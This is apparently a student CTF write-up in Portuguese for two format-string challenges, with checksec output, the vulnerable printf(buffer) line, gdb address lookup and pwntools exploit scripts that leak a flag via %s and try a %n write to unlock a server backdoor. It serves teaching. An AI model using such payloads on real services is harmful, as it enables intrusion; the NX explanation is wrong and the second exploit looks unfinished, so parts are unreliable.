# CTF 6

## Desafio #1

### checksec

```
[11/24/21]seed@VM:~/CTF/6$ checksec --file=program --extended
  RELRO : Partial RELRO
  STACK CANARY: Canary found
  NX: NX enabled
  PIE: No PIE
  Clang CFI: No Clang CFI found
  SafeStack: No SafeStack found
  RPATH: No RPATH
  RUNPATH	: No RUNPATH
  Symbols: 81 Symbols
  FORTIFY: Yes
  Fortified: 0
  Fortifiable:  2
  FILE: program
```

Podemos concluir que:
+ Há um *canary* a prevenir injeção de código detectando modificações à stack
+ A *stack* tem permissão de execução (NX)
+ As posições do binário não estão randomizadas (PIE)
+ Os *return addresses* não estão protegidos numa stack em separado (SafeStack)

// TODO: Deves concluir quais são as proteções e que tipo de ataques é possível fazer.
### Qual é a linha do código onde a vulnerabilidade se encontra?

```c
scanf("%32s", &buffer);
(...)
printf(buffer); // Vulnerability
```

### O que é que a vulnerabilidade permite fazer?

A vulnerabilidade permite fazer consultar o valor variável flag.

### Qual é a funcionalidade que te permite obter a flag?

A funcionalidade que nos permite obter a flag é o %s do printf. 

### Endereço de memória da flag

```
[11/24/21]seed@VM:~/CTF/6$ gdb program
Reading symbols from program...
(...)
gdb-peda$ b load_flag
Breakpoint 1 at 0x8049256: file main.c, line 8.
gdb-peda$ run
(...)
Breakpoint 1, load_flag () at main.c:8
8	void load_flag(){
gdb-peda$ p &flag
$1 = (char (*)[40]) 0x804c060 <flag>
```

O endereço de flag é 0x804c060

### Exploit

```py
#!/usr/bin/env python3
from pwn import *
 
LOCAL = False
 
if LOCAL:
    local = './program'
    p = process(local)
else:
    url = 'ctf-fsi.fe.up.pt'
    port = 4005
    p = remote(url, port)

p.recvuntil(b":")

content = bytearray(0x00 for i in range(32))
val = 0x0804c060
content[0:4] = (val).to_bytes(4, byteorder='little')
content[4:6] = ("%s").encode('latin-1')

p.sendline(content)
p.interactive()
p.recvuntil(b"got:")
p.sendline(b"hi")
p.interactive()
```

FLAG   
 <pre>flag{5fc247063bea425edc863667ac9d09bc}</pre>

## Desafio #2

### checksec

```
[11/24/21]seed@VM:~/CTF/6$ checksec --file=program --extended
  RELRO : Partial RELRO
  STACK CANARY: Canary found
  NX: NX enabled
  PIE: No PIE
  Clang CFI: No Clang CFI found
  SafeStack: No SafeStack found
  RPATH: No RPATH
  RUNPATH	: No RUNPATH
  Symbols: 79 Symbols
  FORTIFY: Yes
  Fortified: 0
  Fortifiable:  1
  FILE: program
```

### Qual é a linha do código onde a vulnerabilidade se encontra?

```c
scanf("%32s", &buffer);
(...)
printf(buffer); // Vulnerability
```

### O que é que a vulnerabilidade permite fazer?

A vulnerabilidade permite alterar o valor da variável key.

### A flag é carregada para memória? Ou existe alguma funcionalidade que podemos utilizar para ter acesso à mesma?

A flag não é carregada para memória mas está presente num ficheiro. A funcionalidade que podemos utilizar para ter acesso à mesma será utilizar a key para ativar a backdoor do 
servidor para conseguirmos ler esse ficheiro.

### Para desbloqueares essa funcionalidade o que é que tens de fazer?

Para desbloquearmos esta funcionalidade temos que abusar da vulnerabilidade do *%n* `printf`. 
Como através do `scanf` podemos escrever para a variável buffer, podemos (depois de descobrir 
o endereço da variável key através do gdb) escrever um conteúdo que abusa da vulnerabilidade 
da format string do printf ao fazer `printf(buffer)`. O conteúdo que devemos escrever na 
variável buffer deve conter o tamanho suficiente seguido de *%n* para alterar o valor da 
variável key para o valor necessário (0xbeef) de modo a conseguirmos ativar a backdoor do 
server para ler o ficheiro onde se encontra a flag.

### Exploit

```py
#!/usr/bin/env python3
from pwn import *

LOCAL = True

if LOCAL:
    local = './program'
    p = process(local)
else:
    url = 'ctf-fsi.fe.up.pt'
    port = 4005
    p = remote(url, port)

p.recvuntil(b"...")

content = bytearray(0x00 for i in range(32))
password = 0xbeef

i = 0
pad_str = "%0" + str(password - 2) + "d"        
content[i:i+len(pad_str)] = (pad_str).encode('latin-1')  
i += len(pad_str) 

pad_str2="%d"
content[i:i+len(pad_str2)] = (pad_str2).encode('latin-1')
i += len(pad_str2)

pad_str3="%X"
content[i:i+len(pad_str3)] = (pad_str3).encode('latin-1')
i += len(pad_str3)

val = 0xBBBBBBBB
content[12:16] = (val).to_bytes(4, byteorder='little')

p.sendline(content)                                                   
#p.recvuntil(b"You gave")
p.interactive()  
```
